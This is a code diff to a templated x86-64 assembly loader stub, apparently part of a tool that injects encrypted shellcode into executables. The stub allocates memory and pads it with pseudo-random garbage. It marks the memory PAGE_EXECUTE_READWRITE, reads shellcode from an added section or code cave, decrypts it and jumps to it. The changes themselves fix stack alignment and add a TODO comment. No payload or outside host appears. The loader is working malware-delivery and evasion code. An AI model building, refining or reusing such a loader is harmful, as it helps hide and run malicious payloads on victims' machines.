@@ -181,7 +181,9 @@ entry:
   add rsp, 0x20
 
   // store allocated memory address
-  push rax
+  // and ensure stack is 16 bytes aligned
+  sub rsp, 0x10
+  mov [rsp], rax
 
   // padding garbage data to page
   mov {{.RegV.rdx}}, rax
@@ -198,10 +200,10 @@ entry:
   add {{.RegV.rax}}, {{.Reg.r11}}
   next1:
   call xor_shift
-  push rax
+push rax
   mov rax, {{.RegV.rax}}
   mov [{{.RegV.rdx}}], al
-  pop rax
+pop rax
   // check padding garbage is finish
   inc {{.RegV.rdx}}
   dec {{.RegV.rcx}}
@@ -211,15 +213,15 @@ entry:
   break1:
 
   // adjust memory region protect
-  sub rsp, 0x08 // for store old protect
-  mov rcx, [rsp + 0x08]
+  sub rsp, 0x10 // for store old protect
+  mov rcx, [rsp + 0x10]
   mov rdx, {{hex .MemRegionSize}}
   mov r8, 0x40 // PAGE_EXECUTE_READWRITE
   mov r9, rsp
   sub rsp, 0x20
   call {{.RegN.r14}}
   add rsp, 0x20
-  add rsp, 0x08 // restore stack
+  add rsp, 0x10 // restore stack
 
 // read shellcode from extended section or code cave
 {{if .SectionMode}}
@@ -257,7 +259,7 @@ entry:
   // check decrypt shellcode is finish
   add {{.RegV.rdx}}, 8
   sub {{.RegV.rcx}}, 8
-  test {{.RegV.rcx}}, {{.RegV.rcx}}
+  test {{.RegV.rcx}}, {{.RegV.rcx}} // TODO improve it
   jz break3
   jmp next3
   break3:
@@ -275,7 +277,7 @@ entry:
   add {{.RegV.rax}}, {{hex .EntryOffset}}
 
   // restore stack about allocated memory address
-  add rsp, 0x08
+  add rsp, 0x10
 
   // call the shellcode
   sub rsp, 0x20
